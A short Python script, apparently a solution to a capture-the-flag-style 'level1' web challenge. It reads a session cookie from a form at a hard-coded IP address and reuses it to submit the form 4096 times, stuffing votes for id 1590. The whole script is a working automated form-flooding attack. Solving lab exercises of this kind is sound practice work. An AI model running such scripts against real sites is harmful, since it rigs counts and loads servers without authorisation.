import requests

url = 'http://158.69.76.135/level1.php'

r = requests.get(url)
data = {
	'id':'1590',
	'holdthedoor':'Submit',
	'key':r.cookies['HoldTheDoor']
}
for i in range(4096):
     requests.post(
     	url,
     	data = data,
     	cookies=r.cookies
 	)
